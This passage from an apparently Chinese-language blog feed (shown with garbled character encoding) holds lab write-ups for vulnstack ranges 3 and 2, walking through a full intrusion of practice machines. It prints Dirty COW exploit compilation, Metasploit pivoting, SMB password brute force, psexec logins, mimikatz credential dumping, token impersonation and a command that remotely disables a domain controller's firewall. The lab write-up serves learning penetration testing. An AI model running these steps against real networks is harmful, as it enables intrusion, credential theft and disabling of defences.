class="hljs-number">3306</span><br>basedir= /usr<br>datadir= /var/lib/mysql<br>tmpdir= /tmp<br>lc-messages-dir= /usr/share/mysql<br>log_error = /var/log/mysql/error.log<br><br><br>/usr/share/mysql/<span class="hljs-symbol">debian_create_root_user.sql:</span><br><br><span class="hljs-title class_">INSERT</span> <span class="hljs-title class_">INTO</span> tmp_user <span class="hljs-title class_">VALUES</span> (<span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;N&#x27;</span>);<br></code></pre></td></tr></table></figure><p>å®åœ¨æ‰¾ä¸åˆ°æœ‰ç”¨çš„ä¿¡æ¯äº†ï¼Œå»çœ‹æ”»ç•¥å‘ç° <code>/tmp</code> ç›®å½•ä¸‹æœ‰ä¸ª <code>mysql</code> æ–‡ä»¶å¤¹â€¦ æˆ‘æ²¡æœ‰å•Šï¼æˆ‘æ²¡æœ‰ï¼ï¼</p><p>å‡è£…æˆ‘æœ‰å§ï¼Œåæ­£å‰é¢ä¹Ÿæ‰¾è¿‡è¿™ä¸ªåœ°æ–¹ï¼Œå‡è£…æ‰¾åˆ°çš„è´¦å·å¯†ç  <code>wwwuser/wwwuser_123Aqx</code> å¥½è€¶(å¥½ä¸ªå±)</p><p>ç›´æ¥sshè¿æ¥ <code>WEB</code> é¶æœº<img src="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231209161456340.png" alt="image-20231209161456340"></p><h5 id="ææƒWEB"><a href="#ææƒWEB" class="headerlink" title="ææƒWEB"></a>ææƒWEB</h5><p>è¿™æ¬¡æ²¡é”™äº†ï¼Œ<code>ip a</code> æŸ¥çœ‹ç½‘å¡ï¼Œç¡®å®æ˜¯ <code>WEB</code> é¶æœºï¼Œcatä¸€ä¸‹ <code>/etc/nginx/nginx.conf</code>ï¼Œæœç„¶åšäº†è½¬å‘ï¼Œè€è´¼<img src="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231209161756516.png" alt="image-20231209161756516"></p><p>åå¼¹shellåˆ°msfï¼Œä¸Šä¼ ä¸€ä¸ª <code>linpeas</code> ï¼ŒæŸ¥çœ‹ææƒä¿¡æ¯<img src="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231209171110248.png" alt="image-20231209171110248"></p><p>sudoæ— æ³•æ‰§è¡Œï¼Œsuidä¹Ÿæ²¡æœ‰å¯ç”¨ï¼Œå°è¯•ç”¨è„ç‰›å†…æ ¸ææƒ</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-meta"># kali</span><br>searchsploit -m <span class="hljs-number">40611</span><br>gcc -pthread <span class="hljs-number">40611.</span>c<br>å°†ç”Ÿæˆçš„a.<span class="hljs-keyword">out</span>ä¸Šä¼ åˆ°é¶æœºå¹¶è¿è¡Œæ—¶å‘ç°glibcç‰ˆæœ¬ä¸å¯¹ï¼Œé™æ€ç¼–è¯‘é‡æ–°ä¸Šä¼ ï¼š<br>gcc -pthread <span class="hljs-number">40839.</span>c -lcrypt --<span class="hljs-keyword">static</span><br></code></pre></td></tr></table></figure><p>ææƒæˆåŠŸï¼Œæ–°å»ºäº†ä¸€ä¸ª <code>firefart</code> ç”¨æˆ·ï¼Œæ›¿ä»£äº†root</p><h3 id="å†…ç½‘-1"><a href="#å†…ç½‘-1" class="headerlink" title="å†…ç½‘"></a>å†…ç½‘</h3><p>ç°åœ¨æ‹¿åˆ°äº† <code>WEB</code> çš„rootæƒé™å’Œ <code>WEB1</code> çš„ä¸´æ—¶ç”¨æˆ·æƒé™ï¼Œä¸Šä¼ ä¸€ä¸ªfscanè¿›è¡Œå†…ç½‘æ‰«æ</p><h4 id="ä¿¡æ¯æœé›†-1"><a href="#ä¿¡æ¯æœé›†-1" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">fscan</span> -h <span class="hljs-number">192.168.93.1</span>-<span class="hljs-number">255</span> -br <span class="hljs-number">100</span><br></code></pre></td></tr></table></figure><p><img src="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231209194319511.png" alt="image-20231209194319511"></p><p>æ–°å‘ç°äº†ä¸‰ä¸ªipï¼š10ï¼Œ20ï¼Œ30ï¼Œä¸‰ä¸ªipå‡å¼€æ”¾äº† <code>135,139ï¼Œ445</code> ä¸” 10 å¼€æ”¾ 88 ç«¯å£ï¼Œ20 å¼€æ”¾ 1433 ç«¯å£</p><p>åœ¨msfä¸Šæ·»åŠ ä¸€ä¸ªè·¯ç”±å¹¶æ·»åŠ ä»£ç†ï¼Œå°†nmapå¸¦å…¥å†…ç½‘(ä¹Ÿå¯ä»¥ä¸Šä¼ nmapåˆ° WEB æœåŠ¡å™¨ï¼Œæ¯•ç«Ÿå·²ç»æ˜¯æˆ‘çš„ç©ç‰©äº†)</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs stata"># msf <span class="hljs-keyword">shell</span>-&gt;meterpreter_shell<br><span class="hljs-keyword">use</span> <span class="hljs-keyword">post</span>/multi/manager/shell_to_meterpreter<br><br># meterpreter æ·»åŠ è·¯ç”±<br><span class="hljs-keyword">run</span> autoroute -s 192.168.93.0/24<br><br><span class="hljs-keyword">use</span> auxiliary/server/socks_proxy<br><span class="hljs-keyword">set</span> srvhost 127.0.0.1<br>ä¿®æ”¹ /etc/proxychains.<span class="hljs-keyword">conf</span><br><br># kali<br>proxychains nmap -Pn -<span class="hljs-keyword">sT</span> 192.168.93.10    # Pn ä¸æ‰§è¡Œpingæ“ä½œ  <span class="hljs-keyword">sT</span>å®Œæ•´çš„ä¸‰æ¬¡æ¡æ‰‹<br></code></pre></td></tr></table></figure><p>è¿™é‡Œä¸æ¸…æ¥šä»€ä¹ˆåŸå› ï¼Œåæ­£æˆ‘çš„nmapå¸¦è¿›å†…ç½‘åä¹Ÿæ‰«ä¸åˆ°ä¸œè¥¿ï¼Œç»™<code>WEB</code>ä¸Šä¼ ä¸€ä¸ªnmap,nmapå®‰è£…éœ€è¦python3.xï¼Œæ‰€ä»¥æˆ‘ä»¬åˆç»™ä»–è£…äº†ä¸ªpythonï¼Œè¿™é‡Œåˆè¸©äº†ä¸ªå‘ï¼Œmakeçš„æ—¶å€™è¦æ±‚ç³»ç»Ÿæ—¶é—´æ™šäºpythonå®‰è£…åŒ…çš„æ—¶é—´ï¼Œå¦åˆ™ä¼šå¡è¿›æ­»å¾ªç¯ï¼Œæ‰€ä»¥è¿˜è¦åˆ©ç”¨ yum å®‰è£… <code>ntpdate</code> â€¦ çœŸæ˜¯ä¸€ç¯å¥—ä¸€ç¯å•Šï¼Œæœ€åä¹Ÿæ²¡å®‰æˆåŠŸï¼Œè€è€å®å®æ¢äº†ä¸ªæ—§ç‰ˆæœ¬(python2å°±èƒ½ç”¨çš„)ï¼Œæ‰€ä»¥æˆ‘è¾›è‹¦è£…python3å›¾ä¸ªå•¥â€¦</p><p>å®‰è£…å®Œæˆï¼Œå¯åŠ¨ï¼</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># WEBé¶æœº</span><br><span class="hljs-attribute">nmap</span> --script=vuln <span class="hljs-number">192.168.93.10</span>-<span class="hljs-number">30</span><br></code></pre></td></tr></table></figure><p>ç„¶è€Œä¸€ä¸ªæ´éƒ½æ²¡æœ‰â€¦å¥½å•Šâ€¦æ‰€ä»¥æˆ‘è´¹å°½å¿ƒæ€åœ°è£…ä¸€ä¸ªnmapæœ‰ä»€ä¹ˆç”¨â€¦è‡ªé—­ing</p><h4 id="å¥‡æ·«å·§è®¡"><a href="#å¥‡æ·«å·§è®¡" class="headerlink" title="å¥‡æ·«å·§è®¡"></a>å¥‡æ·«å·§è®¡</h4><p>è¿™æ—¶å€™å»ç¿»åˆ«äººçš„wpï¼Œæœ‰ä¸¤ç§æ–¹æ¡ˆï¼Œç¬¬ä¸€æ˜¯é’“é±¼â€¦å¯¹ï¼Œè‡ªå·±å»ºä¸€ä¸ªé’“é±¼ç½‘ç«™ï¼Œè‡ªå·±ç™»è¿›å»é¶æœºè£…ä½œå—å®³äººæŠŠè‡ªå·±çš„è´¦å·å¯†ç è¾“è¿›å»â€¦ä¹Ÿè¡Œå§</p><p>å¦ä¸€ç§æ–¹æ³•å°±æ˜¯çˆ†ç ´ã€‚ã€‚ã€‚é¶æœºå¼€å¯äº†smbæœåŠ¡ï¼Œåˆ©ç”¨msfçš„smb_loginæ¨¡å—ï¼Œé»˜è®¤è´¦æˆ·å <code>administrator</code> å¯†ç å­—å…¸è¿™é‡Œç”¨ <code>rockyou.txt</code> å½“ç„¶è¿™é‡Œé¢æ²¡æœ‰è¿™ä¸ªå¯†ç â€¦ ä¸ºäº†é¢˜ç›®èƒ½ç»§ç»­ä¸‹å»ï¼Œæˆ‘æ‰‹åŠ¨æ·»åŠ äº†å¯†ç  <code>123qwe!ASD</code> å¼€è·‘ï¼</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gams"># msf(å·²ç»å»ºç«‹å¥½è·¯ç”±)<br>use auxiliary/scanner/smb/smb_login<br>show <span class="hljs-keyword">options</span><br><span class="hljs-keyword">set</span> smbuser <span class="hljs-comment">administrator</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">pass_file</span> /usr/<span class="hljs-comment">share</span>/wordlists/<span class="hljs-comment">rockyou.txt</span><br>run<br></code></pre></td></tr></table></figure><p>é€Ÿåº¦å¤ªæ…¢äº†ï¼Œç›´æ¥å‡è£…æˆ‘ä»¬å·²ç»æ‹¿åˆ°äº†å¯†ç (å®é™…ä¸­æµªè´¹è¿™ä¹ˆä¹…åŸºæœ¬å¯ä»¥æ”¾å¼ƒäº†)ï¼Œç°åœ¨ç”¨msfè¿åˆ° 30 è¿™å°é¶æœº</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># msf</span><br>use exploit/windows/smb/psexec<br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/bind_tcp<br><span class="hljs-built_in">set</span> rhosts 192.168.93.30<br><span class="hljs-built_in">set</span> smbuser administrator<br><span class="hljs-built_in">set</span> smbpass 123qwe!ASD <br>run<br></code></pre></td></tr></table></figure><p>æ‹¿åˆ°äº† 30(win7) çš„ <code>meterpreter_shell</code> ä½†æ˜¯è¿›ç¨‹é‡Œå¹¶æ²¡æœ‰åŸŸæ§ <code>test</code> çš„è¿›ç¨‹ï¼Œå› æ­¤å¯¼å…¥ <code>kiwi</code> åŒ…ä¹Ÿåªèƒ½åŠ è½½å‡ºåŠ å¯†åçš„ åŸŸç®¡ç†å‘˜å¯†ç <img src="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231211171200038.png" alt="image-20231211171200038"></p><p>æˆ‘ä»¬å°è¯•ç”¨åŒæ ·çš„è´¦å·å¯†ç è¿æ¥ 20 é¶æœºï¼ŒæˆåŠŸè¿›å…¥ï¼Œå†æ¬¡psï¼Œå‘ç° <code>TEST</code> ç”¨æˆ·çš„è¿›ç¨‹ï¼Œmigrate è¿‡å»ï¼Œåˆ©ç”¨kiwiæŠ“å–å¯†ç </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta"># meterpreter</span><br>load kiwi<br>kiwi_cmd sekurlsa::logonpasswords<br></code></pre></td></tr></table></figure><p>okk<img src="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231211172039008.png" alt="image-20231211172039008"></p><h4 id="æ‹¿DC"><a href="#æ‹¿DC" class="headerlink" title="æ‹¿DC"></a>æ‹¿DC</h4><p>ç°åœ¨æˆ‘ä»¬æ‹¿åˆ°äº†åŸŸç®¡ç†å‘˜çš„è´¦å·å¯†ç ï¼Œåˆ©ç”¨msfçš„smbç™»å½•ç¨‹åºï¼Œå°è¯•ç™»å½• DC(10é¶æœº)</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># msf</span><br>use exploit/windows/smb/psexec<br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/bind_tcp<br><span class="hljs-built_in">set</span> rhosts 192.168.93.10<br><span class="hljs-built_in">set</span> smbuser administrator<br><span class="hljs-built_in">set</span> smbpass zxcASDqw123!!<br><span class="hljs-built_in">set</span> SMBDomain TEST.ORG<br>run<br></code></pre></td></tr></table></figure><p>å¤±è´¥äº†â€¦<img src="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231211173803876.png" alt="image-20231211173803876"></p><p>ç»è¿‡ä¸€ç•ªæŸ¥æ‰¾å­¦ä¹ ï¼Œæˆ‘äº†è§£åˆ°åˆä¸€ä¸ªæ–°çŸ¥è¯† <strong>msfä»¤ç‰Œçªƒå–</strong> </p><p>å‚è€ƒèµ„æ–™ <a href="https://www.freebuf.com/articles/web/284135.html">msfä»¤ç‰Œçªƒå– - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p><p>æˆ‘ä»¬å…ˆå›åˆ°ç™»å½•äº† 20 é¶æœºçš„ session</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-comment"># meterpreter</span><br><span class="hljs-keyword">use</span> incognito      <span class="hljs-comment"># è¿›å…¥éšèº«æ¨¡å¼(å¦åˆ™ä»¥ä¸‹å‘½ä»¤æ— æ³•æ‰§è¡Œ) </span><br>list_tokens -u     <span class="hljs-comment"># åˆ—å‡ºå¯ç”¨ä»¤ç‰Œ</span><br>impersonate_token <span class="hljs-string">&quot;TEST\adminitrator&quot;</span>  <span class="hljs-comment"># çªƒå–TESTåŸŸçš„ç®¡ç†å‘˜ä»¤ç‰Œ</span><br></code></pre></td></tr></table></figure><p><img src="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231211180553265.png" alt="image-20231211180553265"></p><p><img src="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231211180648001.png" alt="image-20231211180648001"></p><p>è¿™é‡Œæœ‰ä¸ªæ³¨æ„ç‚¹ï¼Œå¿…é¡»è¦åŸŸç®¡ç†å‘˜ç™»é™†äº† 20 é¶æœºï¼Œæˆ‘ä»¬æ‰èƒ½æˆåŠŸçªƒå–åˆ°ä»¤ç‰Œï¼Œæˆ‘çš„æœºå­é‡å¯åå¹¶æ²¡æœ‰ç™»å½•ï¼Œæ‰€ä»¥å°±æ²¡èƒ½çªƒå–åˆ°ï¼Œéœ€è¦æ‰‹åŠ¨ç™»é™†ä¸€ä¸‹åŸŸç®¡ç†å‘˜è´¦å·ï¼Œè¿™ä¸€ç‚¹ä»è¿›ç¨‹åˆ—è¡¨é‡Œä¹Ÿèƒ½çœ‹åˆ°ï¼Œå½“ä¸å­˜åœ¨TESTåŸŸçš„è¿›ç¨‹æ—¶ï¼Œä¹Ÿå°±æ²¡æœ‰ç›¸åº”çš„ä»¤ç‰Œ</p><p>çªƒå–åˆ°åï¼Œæˆ‘ä»¬å½“å‰çš„ç”¨æˆ·å°±æ˜¯ <code>TEST\administrator</code> ï¼Œè¿›å…¥shellï¼Œå…³é—­é˜²ç«å¢™</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-comment"># meterpreter</span><br><span class="hljs-keyword">shell</span><br><span class="hljs-keyword"></span><br><span class="hljs-comment"># shell</span><br><span class="hljs-keyword">sc </span>\\<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">93</span>.<span class="hljs-number">10</span> create unablefirewall <span class="hljs-keyword">binpath= </span><span class="hljs-string">&quot;netsh advfirewall set allprofiles state off&quot;</span><br><span class="hljs-keyword">sc </span>\\<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">93</span>.<span class="hljs-number">10</span> start unablefirewall<br></code></pre></td></tr></table></figure><p>ç™»å½• 10 é¶æœºå¯ä»¥çœ‹åˆ°é˜²ç«å¢™å·²è¢«å…³é—­<img src="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231211181119630.png" alt="image-20231211181119630"></p><p>å†æ¬¡å°è¯•ä¹‹å‰çš„smbç™»å½•ï¼ŒæˆåŠŸ<img src="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231211181242145.png" alt="image-20231211181242145"></p><p>æœ€ååœ¨ç®¡ç†å‘˜çš„æ–‡æ¡£é‡Œæ‰¾åˆ°flag<img src="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231211181326428.png" alt="image-20231211181326428"></p>]]></content>
    
    
    
    <tags>
      
      <tag>è§£é¢˜è®°å½•</tag>
      
      <tag>å­¦ä¹ </tag>
      
      <tag>vulnstack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnstacké¶åœºæ—¥è®°-2</title>
    <link href="/2023/12/04/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-2/"/>
    <url>/2023/12/04/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-2/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h3 id="é¶åœºäºŒ"><a href="#é¶åœºäºŒ" class="headerlink" title="é¶åœºäºŒ"></a>é¶åœºäºŒ</h3><h4 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h4><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gcode">æ”»å‡»æœºï¼š<br>    kali<br>é¶æœºï¼š<br>    DC  Wi<span class="hljs-symbol">n2012</span><span class="hljs-comment">(64)</span><br>    PC  wi<span class="hljs-symbol">n7</span><span class="hljs-comment">(32)</span><br>    WEB wi<span class="hljs-symbol">nServer2008</span> R<span class="hljs-number">2</span><span class="hljs-comment">(64)</span><br></code></pre></td></tr></table></figure><ol><li><p>é¶æœºå¯†ç å‡ä¸º <code>1qaz@WSX</code> ï¼Œå…¶ä¸­WEBç™»ä¸è¿›ï¼Œéœ€è¦åˆ‡æ¢ç”¨æˆ·ï¼Œç›´æ¥ <code>de1ay/1qaz@WSX</code> ç™»å½•ï¼Œä¸è¦ç”¨ <code>WEBåŸŸ</code></p></li><li><p>éœ€è¦æ‰‹åŠ¨å¼€å¯WEBæœåŠ¡(ä¸Šæ¥ç›´æ¥æ‰«æ¼æ´æ— åŠŸè€Œè¿”å°±æ˜¯æ²¡äººå‘Šè¯‰æˆ‘è¦å¼€æœåŠ¡â€¦)ï¼Œåœ¨ <code>C:\Oracle\Middleware\user_projects\domains\base_domain\bin</code> ä¸‹æœ‰ä¸€ä¸ª <code>startWeblogic</code> çš„æ‰¹å¤„ç†ï¼Œç®¡ç†å‘˜èº«ä»½è¿è¡Œå®ƒï¼Œç®¡ç†å‘˜è´¦å·å¯†ç ï¼š<code>Administrator/1qaz@WSX</code> (æ³¨æ„å¤§å°å†™)</p></li><li><p>å¦‚æœç‚¹äº†ä¹‹åé»‘æ¡†é—ªä¸€ä¸‹å°±æ²¡ï¼Œè¯´æ˜ç”¨çš„æ˜¯æ™®é€šç”¨æˆ·æƒé™ï¼Œå³é”®ç®¡ç†å‘˜è¿è¡Œ</p></li></ol><h4 id="ç½‘ç»œé…ç½®"><a href="#ç½‘ç»œé…ç½®" class="headerlink" title="ç½‘ç»œé…ç½®"></a>ç½‘ç»œé…ç½®</h4><p>é¶æœºçš„ipæœ‰ä¸¤ä¸ªç½‘æ®µ <code>192.168.111.0/24</code>  å’Œ <code>10.10.10.0/24</code> (æ³¨æ„é¡ºåº)ï¼Œæˆ‘ä»¬æ–°å¼€ä¸€ä¸ªç½‘å¡VMnet3ï¼Œé…ç½®ä¸ºä»…ä¸»æœºæ¨¡å¼ï¼Œç½‘æ®µä¸º <code>192.168.111.0/24</code> ï¼ŒåŒæ—¶VMé»˜è®¤çš„ä»…ä¸»æœºæ¨¡å¼ç½‘å¡ä¸º VMnet1ï¼Œå°†VMnet3æ·»åŠ ç»™kaliå’Œä¸¤ä¸ªå…·æœ‰å…¬ç½‘ip(192.168.111.xxx)çš„é¶æœº</p><h5 id="å¤–ç½‘-VMnet3"><a href="#å¤–ç½‘-VMnet3" class="headerlink" title="å¤–ç½‘(VMnet3)"></a>å¤–ç½‘(VMnet3)</h5><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">kali</span> <span class="hljs-number">192.168.111.128</span><br>PC   <span class="hljs-number">192.168.111.201</span><br>WEB  <span class="hljs-number">192.168.111.80</span><br></code></pre></td></tr></table></figure><h5 id="å†…ç½‘-ä»…ä¸»æœºæ¨¡å¼-VMnet1"><a href="#å†…ç½‘-ä»…ä¸»æœºæ¨¡å¼-VMnet1" class="headerlink" title="å†…ç½‘(ä»…ä¸»æœºæ¨¡å¼ - VMnet1)"></a>å†…ç½‘(ä»…ä¸»æœºæ¨¡å¼ - VMnet1)</h5><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">DC</span>  <span class="hljs-number">10.10.10.10</span><br>PC  <span class="hljs-number">10.10.10.201</span><br>WEB <span class="hljs-number">10.10.10.80</span><br></code></pre></td></tr></table></figure><h5 id="è¿é€šæ€§"><a href="#è¿é€šæ€§" class="headerlink" title="è¿é€šæ€§"></a>è¿é€šæ€§</h5><p>PC å’Œ WEB ä¸¤å°æœºå­ä¸Šæœ‰é˜²ç«å¢™ï¼Œæ‰€æœ‰æœºå­éƒ½pingä¸åŒè¿™ä¸¤å°</p><p>å†…ç½‘éƒ½å¯ä»¥pingé€š DC</p><p>å¤–ç½‘éƒ½å¯ä»¥pingé€š kali</p><h4 id="å‰æ¸—é€"><a href="#å‰æ¸—é€" class="headerlink" title="å‰æ¸—é€"></a>å‰æ¸—é€</h4><h5 id="ä¸»æœºå‘ç°"><a href="#ä¸»æœºå‘ç°" class="headerlink" title="ä¸»æœºå‘ç°"></a>ä¸»æœºå‘ç°</h5><p>nmapå‘ç°ipå’Œå¼€æ”¾ç«¯å£</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns">nmap <span class="hljs-number">192.168.111.0</span>/<span class="hljs-number">24</span><br>nmap -<span class="hljs-keyword">A</span> -sS -sV -p- <span class="hljs-number">192.168.111.201</span><br>nmap -<span class="hljs-keyword">A</span> -sS -sV -p- <span class="hljs-number">192.168.111.80</span><br></code></pre></td></tr></table></figure><p><img src="/2023/12/04/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-2/image-20231204111818397.png" alt="image-20231204111818397"></p><h5 id="æ¼æ´æ‰«æ"><a href="#æ¼æ´æ‰«æ" class="headerlink" title="æ¼æ´æ‰«æ"></a>æ¼æ´æ‰«æ</h5><p>åˆ©ç”¨nmapçš„æ¼æ‰«æ’ä»¶</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">nmap <span class="hljs-attribute">--script</span>=vuln 192.168.111.80<br><span class="hljs-comment"># å‘ç°æ°¸æ’ä¹‹è“ï¼Œåˆ©ç”¨å¤±è´¥</span><br><br>nmap <span class="hljs-attribute">--script</span>=vuln 192.168.111.201<br><span class="hljs-comment"># åŒæ ·æœ‰æ°¸æ’ä¹‹è“ï¼Œåˆ©ç”¨å¤±è´¥ï¼ŒçŒœæµ‹æ˜¯å¼€å¯äº†é˜²ç«å¢™</span><br></code></pre></td></tr></table></figure><p><img src="/2023/12/04/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-2/image-20231204104109229.png" alt="image-20231204104109229"></p><p>å›åˆ°ä¸Šä¸€æ­¥ï¼ŒWEBæœåŠ¡å™¨å¼€äº†7001 <code>weblogic</code> æœåŠ¡(åºŸè¯ï¼Œæˆ‘äº²æ‰‹å¼€çš„)ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰æ¼æ´å¯åˆ©ç”¨ï¼Œè¿™é‡Œä½¿ç”¨ <a href="https://github.com/0xn0ne/weblogicScanner">0xn0ne&#x2F;weblogicScanner</a> å’Œ <a href="https://github.com/KimJun1010/WeblogicTool">KimJun1010&#x2F;WeblogicTool</a> ï¼Œå‰è€…ç”¨äºæ¢æµ‹ï¼Œåè€…ç”¨äºéªŒè¯</p><p>æ‰«æç»“æœ<img src="/2023/12/04/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-2/image-20231204144913536.png" alt="image-20231204144913536"></p><p>æ£€æµ‹ç»“æœ<img src="/2023/12/04/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-2/image-20231204144934193.png" alt="image-20231204144934193"><img src="/2023/12/04/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-2/image-20231204145042455.png" alt="image-20231204145042455"><img src="/2023/12/04/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-2/image-20231204145927252.png" alt="image-20231204145927252"></p><h5 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" 